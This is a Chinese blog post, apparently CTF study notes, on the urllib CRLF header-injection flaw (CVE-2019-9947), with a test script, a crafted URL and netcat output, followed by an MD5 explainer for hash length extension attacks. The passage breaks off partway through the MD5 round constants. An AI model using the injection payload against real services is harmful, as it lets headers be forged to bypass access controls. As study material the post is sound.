<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言由于最近在打ctf因此遇到了一个python库的漏洞因此总结一下。 0x01 python urllib(urllib2)库的漏洞分析0x001 python 2.7.16测试代码如下：123456import urllib2url = &quot;http://192.168.220.157:8080/renderer/admin/ticket?ticket=6edaec793cac4db942472">
<meta property="og:type" content="article">
<meta property="og:title" content="Python urllib HTTP头注入漏洞">
<meta property="og:url" content="http://yoursite.com/2020/03/14/Python-urllib-HTTP头注入漏洞/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言由于最近在打ctf因此遇到了一个python库的漏洞因此总结一下。 0x01 python urllib(urllib2)库的漏洞分析0x001 python 2.7.16测试代码如下：123456import urllib2url = &quot;http://192.168.220.157:8080/renderer/admin/ticket?ticket=6edaec793cac4db942472">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2020-03-14T07:47:36.172Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Python urllib HTTP头注入漏洞">
<meta name="twitter:description" content="前言由于最近在打ctf因此遇到了一个python库的漏洞因此总结一下。 0x01 python urllib(urllib2)库的漏洞分析0x001 python 2.7.16测试代码如下：123456import urllib2url = &quot;http://192.168.220.157:8080/renderer/admin/ticket?ticket=6edaec793cac4db942472">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/03/14/Python-urllib-HTTP头注入漏洞/">





  <title>Python urllib HTTP头注入漏洞 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/Python-urllib-HTTP头注入漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Python urllib HTTP头注入漏洞</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T15:46:19+08:00">
                2020-03-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.2k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  27
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于最近在打ctf因此遇到了一个python库的漏洞因此总结一下。</p>
<h4 id="0x01-python-urllib-urllib2-库的漏洞分析"><a href="#0x01-python-urllib-urllib2-库的漏洞分析" class="headerlink" title="0x01 python urllib(urllib2)库的漏洞分析"></a>0x01 python urllib(urllib2)库的漏洞分析</h4><h5 id="0x001-python-2-7-16"><a href="#0x001-python-2-7-16" class="headerlink" title="0x001 python 2.7.16"></a>0x001 python 2.7.16</h5><h6 id="测试代码如下："><a href="#测试代码如下：" class="headerlink" title="测试代码如下："></a>测试代码如下：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.220.157:8080/renderer/admin/ticket?ticket=6edaec793cac4db942472712a57d656b06d4cd0c HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nHost: 127.0.0.1\r\n\r\nLol"</span></span><br><span class="line"></span><br><span class="line">info = urllib2.urlopen(url).read()</span><br><span class="line">print(info)</span><br></pre></td></tr></table></figure>

<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -lvp 8080</span><br><span class="line">listening on [any] 8080 ...</span><br><span class="line">connect to [192.168.220.157] from kali [192.168.220.157] 49652</span><br><span class="line">GET /renderer/admin/ticket?ticket=6edaec793cac4db942472712a57d656b06d4cd0c HTTP/1.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">User-Agent: AdminBrowser/1.337</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Lol HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 192.168.220.157:8080</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Python-urllib/2.7</span><br></pre></td></tr></table></figure>

<h6 id="我们可以看到已经成功的进行了CRLF注入。"><a href="#我们可以看到已经成功的进行了CRLF注入。" class="headerlink" title="我们可以看到已经成功的进行了CRLF注入。"></a>我们可以看到已经成功的进行了CRLF注入。</h6><h5 id="0x002-python-3-7-3"><a href="#0x002-python-3-7-3" class="headerlink" title="0x002 python 3.7.3"></a>0x002 python 3.7.3</h5><h6 id="测试代码如下：-1"><a href="#测试代码如下：-1" class="headerlink" title="测试代码如下："></a>测试代码如下：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># url=sys.argv[1]</span></span><br><span class="line">url = <span class="string">"http://192.168.220.157:8080/renderer/admin/ticket?ticket=6edaec793cac4db942472712a57d656b06d4cd0c HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nHost: 127.0.0.1\r\n\r\nLol"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info=urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>

<h6 id="结果如下：-1"><a href="#结果如下：-1" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 8080 ...</span><br><span class="line">connect to [192.168.220.157] from kali [192.168.220.157] 49654</span><br><span class="line">GET /renderer/admin/ticket?ticket=6edaec793cac4db942472712a57d656b06d4cd0c HTTP/1.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">User-Agent: AdminBrowser/1.337</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Lol HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 192.168.220.157:8080</span><br><span class="line">User-Agent: Python-urllib/3.7</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h5 id="0x003-已有漏洞的版本"><a href="#0x003-已有漏洞的版本" class="headerlink" title="0x003 已有漏洞的版本"></a>0x003 已有漏洞的版本</h5><h6 id="2-7-16-3-7-3"><a href="#2-7-16-3-7-3" class="headerlink" title="2.7.16~3.7.3"></a>2.7.16~3.7.3</h6><h6 id="https-nvd-nist-gov-vuln-detail-CVE-2019-9947"><a href="#https-nvd-nist-gov-vuln-detail-CVE-2019-9947" class="headerlink" title="https://nvd.nist.gov/vuln/detail/CVE-2019-9947"></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9947" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2019-9947</a></h6><h5 id="0x004-源码分析："><a href="#0x004-源码分析：" class="headerlink" title="0x004 源码分析："></a>0x004 源码分析：</h5><h4 id="0x02-hash长度扩展攻击"><a href="#0x02-hash长度扩展攻击" class="headerlink" title="0x02 hash长度扩展攻击"></a>0x02 hash长度扩展攻击</h4><h5 id="0x001-md5简介"><a href="#0x001-md5简介" class="headerlink" title="0x001 md5简介"></a>0x001 md5简介</h5><h6 id="MD5即Message-Digest-Algorithm-5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。"><a href="#MD5即Message-Digest-Algorithm-5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。" class="headerlink" title="MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。"></a>MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。</h6><h6 id="MD5算法具有以下特点："><a href="#MD5算法具有以下特点：" class="headerlink" title="MD5算法具有以下特点："></a>MD5算法具有以下特点：</h6><h6 id="1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。"><a href="#1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。" class="headerlink" title="1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。"></a>1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。</h6><h6 id="2、容易计算：从原数据计算出MD5值很容易。"><a href="#2、容易计算：从原数据计算出MD5值很容易。" class="headerlink" title="2、容易计算：从原数据计算出MD5值很容易。"></a>2、容易计算：从原数据计算出MD5值很容易。</h6><h6 id="3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。"><a href="#3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。" class="headerlink" title="3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。"></a>3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</h6><h6 id="4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。"><a href="#4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。" class="headerlink" title="4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。"></a>4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。</h6><h6 id="MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。"><a href="#MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。" class="headerlink" title="MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。"></a>MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。</h6><h6 id="大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。"><a href="#大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。" class="headerlink" title="大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。"></a>大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。</h6><h5 id="0x002-md5加密原理步骤"><a href="#0x002-md5加密原理步骤" class="headerlink" title="0x002 md5加密原理步骤"></a>0x002 md5加密原理步骤</h5><h6 id="1-补充"><a href="#1-补充" class="headerlink" title="1.补充"></a>1.补充</h6><h6 id="在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。因此，信息的位长（Bits-Length）将被扩展至N-512-448，N为一个非负整数，N可以是零。"><a href="#在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。因此，信息的位长（Bits-Length）将被扩展至N-512-448，N为一个非负整数，N可以是零。" class="headerlink" title="在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。"></a>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，<code>并且填充必须进行，即使其位长对512求余的结果等于448</code>。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</h6><h6 id="填充的方法如下："><a href="#填充的方法如下：" class="headerlink" title="填充的方法如下："></a>填充的方法如下：</h6><h6 id="1-在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。"><a href="#1-在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。" class="headerlink" title="1)在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。"></a>1)在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</h6><h6 id="2-在这个结果后面附加一个64位二进制表示的填充前信息长度-单位位Bit-，如果二进制表示的填充前信息长度超过64位，则取低位64位。"><a href="#2-在这个结果后面附加一个64位二进制表示的填充前信息长度-单位位Bit-，如果二进制表示的填充前信息长度超过64位，则取低位64位。" class="headerlink" title="2)在这个结果后面附加一个64位二进制表示的填充前信息长度(单位位Bit)，如果二进制表示的填充前信息长度超过64位，则取低位64位。"></a>2)在这个结果后面附加一个64位二进制表示的填充前信息长度(单位位Bit)，如果二进制表示的填充前信息长度超过64位，则取低位64位。</h6><h6 id="经过这两步的处理，信息的位长-N512-448-64-N-1-512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。"><a href="#经过这两步的处理，信息的位长-N512-448-64-N-1-512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。" class="headerlink" title="经过这两步的处理，信息的位长=N512+448+64=(N+1)512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。"></a>经过这两步的处理，信息的位长=N<em>512+448+64=(N+1)</em>512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</h6><h6 id="2-初始化变量"><a href="#2-初始化变量" class="headerlink" title="2.初始化变量"></a>2.初始化变量</h6><h6 id="初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为：-A-0x01234567，B-0x89ABCDEF，C-0xFEDCBA98，D-0x76543210。"><a href="#初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为：-A-0x01234567，B-0x89ABCDEF，C-0xFEDCBA98，D-0x76543210。" class="headerlink" title="初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为： A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。"></a>初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为： A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。</h6><h6 id="每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476"><a href="#每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476" class="headerlink" title="(每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476)"></a>(每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476)</h6><h6 id="3-处理分组数据"><a href="#3-处理分组数据" class="headerlink" title="3.处理分组数据"></a>3.处理分组数据</h6><h6 id="每一分组的算法流程如下："><a href="#每一分组的算法流程如下：" class="headerlink" title="每一分组的算法流程如下："></a>每一分组的算法流程如下：</h6><h6 id="第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A-a，-B-b，-C-c，-D-d。"><a href="#第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A-a，-B-b，-C-c，-D-d。" class="headerlink" title="第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A = a， B = b， C = c， D = d。"></a>第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A = a， B = b， C = c， D = d。</h6><h6 id="主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。"><a href="#主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。" class="headerlink" title="主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。"></a>主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。</h6><h6 id="以下是每次操作中用到的四个非线性函数（每轮一个）。"><a href="#以下是每次操作中用到的四个非线性函数（每轮一个）。" class="headerlink" title="以下是每次操作中用到的四个非线性函数（每轮一个）。"></a>以下是每次操作中用到的四个非线性函数（每轮一个）。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">F( X ,Y ,Z ) = ( X &amp; Y ) | ( (~X) &amp; Z )</span><br><span class="line"></span><br><span class="line">G( X ,Y ,Z ) = ( X &amp; Z ) | ( Y &amp; (~Z) )</span><br><span class="line"></span><br><span class="line">H( X ,Y ,Z ) =X ^ Y ^ Z</span><br><span class="line"></span><br><span class="line">I( X ,Y ,Z ) =Y ^ ( X | (~Z) )</span><br></pre></td></tr></table></figure>

<h6 id="amp-是与-And-，-是或-Or-，-是非-Not-，-是异或-Xor"><a href="#amp-是与-And-，-是或-Or-，-是非-Not-，-是异或-Xor" class="headerlink" title="(&amp;是与(And)，|是或(Or)，~是非(Not)，^是异或(Xor))"></a>(&amp;是与(And)，|是或(Or)，~是非(Not)，^是异或(Xor))</h6><h6 id="这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。"><a href="#这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。" class="headerlink" title="这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。"></a>这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。</h6><h6 id="F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。"><a href="#F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。" class="headerlink" title="F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。"></a>F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。</h6><h6 id="假设Mj表示消息的第j个子分组-从0到15-，常数ti是4294967296-abs-sin-i-的整数部分，i取值从1到64，单位是弧度。-4294967296-2的32次方"><a href="#假设Mj表示消息的第j个子分组-从0到15-，常数ti是4294967296-abs-sin-i-的整数部分，i取值从1到64，单位是弧度。-4294967296-2的32次方" class="headerlink" title="假设Mj表示消息的第j个子分组(从0到15)，常数ti是4294967296*abs(sin(i))的整数部分，i取值从1到64，单位是弧度。(4294967296=2的32次方)"></a>假设Mj表示消息的第j个子分组(从0到15)，常数ti是4294967296*abs(sin(i))的整数部分，i取值从1到64，单位是弧度。(4294967296=2的32次方)</h6><h6 id="现定义："><a href="#现定义：" class="headerlink" title="现定义："></a>现定义：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FF(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + F(b,c,d) + Mj + ti) &lt;&lt; s)</span><br><span class="line"></span><br><span class="line">GG(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + G(b,c,d) + Mj + ti) &lt;&lt; s)</span><br><span class="line"></span><br><span class="line">HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + H(b,c,d) + Mj + ti) &lt;&lt; s)</span><br><span class="line"></span><br><span class="line">II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + I(b,c,d) + Mj + ti) &lt;&lt; s)</span><br></pre></td></tr></table></figure>

<h6 id="注意：-lt-lt-表示循环左移位，不是左移位。"><a href="#注意：-lt-lt-表示循环左移位，不是左移位。" class="headerlink" title="注意：&lt;&lt;表示循环左移位，不是左移位。"></a>注意：<code>&lt;&lt;</code>表示循环左移位，不是左移位。</h6><h6 id="这四轮-64步-是："><a href="#这四轮-64步-是：" class="headerlink" title="这四轮(64步)是："></a>这四轮(64步)是：</h6><h6 id="第一轮"><a href="#第一轮" class="headerlink" title="第一轮"></a>第一轮</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">FF(a ,b ,c ,d ,M0 ,7 ,0xd76aa478 )</span><br><span class="line"></span><br><span class="line">FF(d ,a ,b ,c ,M1 ,12 ,0xe8c7b756 )</span><br><span class="line"></span><br><span class="line">FF(c ,d ,a ,b ,M2 ,17 ,0x242070db )</span><br><span class="line"></span><br><span class="line">FF(b ,c ,d ,a ,M3 ,22 ,0xc1bdceee )</span><br><span 